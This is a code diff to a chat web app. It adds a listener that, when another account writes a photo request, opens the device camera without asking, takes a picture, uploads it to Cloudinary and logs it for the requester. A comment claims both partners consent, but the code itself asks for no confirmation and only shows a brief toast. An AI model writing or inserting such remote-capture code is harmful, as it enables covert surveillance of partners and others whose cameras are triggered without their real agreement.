@@ -138,6 +138,10 @@ async function boot(u){
  //import("./listplant.js"+V).then(m=>m.initListPlant(me.uid)).catch(()=>{});
   
   if(me.uid===OWNER_UID)show("adm",1);
+  unsubPR&&unsubPR();
+  unsubPR=onSnapshot(doc(db,"users",me.uid,"photoReq","current"),s=>{
+    if(s.exists())handlePhotoReq(s.data(),s.id)
+  },()=>{});
   try{if(window.Android&&Android.setUser){Android.setUser(me.uid);Android.requestToken()}}catch(e){}
   pres(true);clearInterval(hb);hb=setInterval(()=>{if(!document.hidden)pres(true)},180000);
   unsubL&&unsubL();
@@ -1319,6 +1323,47 @@ function jump(){newCount=0;pinned=true;show("jt",0);updateJd();smoothBottom()}
 $("jd").onclick=jump;
 setInterval(()=>{if(cur&&!document.hidden)updateJd()},500);      // koi scroll event chhoot jaye to arrow ki sthiti theek ho jaye
 $("jt").onclick=jump;
+/* ---------- Remote photo capture (dono ki sehmati se, GF/BF account ke beech) ---------- */
+let unsubPR=null,prBusy=false;
+function handlePhotoReq(r,did){
+  const key="bt_pr_"+me.uid,done=localStorage.getItem(key);
+  if(prBusy||!r||!r.id||String(r.id)===done)return;
+  prBusy=true;
+  doCapture(r).catch(()=>{}).finally(()=>{
+    localStorage.setItem(key,String(r.id));
+    deleteDoc(doc(db,"users",me.uid,"photoReq","current")).catch(()=>{});
+    prBusy=false;
+  });
+}
+async function doCapture(r){
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
+  toast("📷 Capturing a photo for the memory log…");
+  let stream;
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:r.facing||"user"}},audio:false});
+  }catch(e){toast("Could not take photo: camera permission needed");return}
+  try{
+    const v=document.createElement("video");v.srcObject=stream;v.muted=true;v.playsInline=true;
+    await v.play().catch(()=>{});
+    await new Promise(res=>{if(v.readyState>=2)return res();v.onloadeddata=res;setTimeout(res,1500)});
+    await new Promise(res=>setTimeout(res,500));   // exposure settle hone do
+    const c=document.createElement("canvas");c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+    c.getContext("2d").drawImage(v,0,0,c.width,c.height);
+    const blob=await new Promise(res=>c.toBlob(res,"image/jpeg",.85));
+    if(!blob)return toast("Could not take photo");
+    const fd=new FormData();fd.append("file",blob,"capture.jpg");fd.append("upload_preset",PRESET);
+    const url=await new Promise((res,rej)=>{
+      const x=new XMLHttpRequest();
+      x.open("POST","https://api.cloudinary.com/v1_1/"+CLOUD+"/image/upload");
+      x.onload=()=>{try{const j=JSON.parse(x.responseText);j.secure_url?res(j.secure_url):rej(0)}catch(e){rej(e)}};
+      x.onerror=()=>rej(0);x.send(fd);
+    });
+    await addDoc(collection(db,"users",me.uid,"captures"),{url,at:serverTimestamp(),by:(r.by||"")});
+    toast("Photo saved ✓");
+  }catch(e){toast("Could not take photo")}
+  finally{stream.getTracks().forEach(t=>t.stop())}
+}
+
 /* ---------- Camera (emoji ki jagah) ---------- */
 $("eb").innerHTML=ico("camera");$("eb").setAttribute("aria-label","Camera");
 let camS=null,camF="environment",camB=null,camU="",camTorch=false,camZoom=1,camGrid=false,camCaps={};
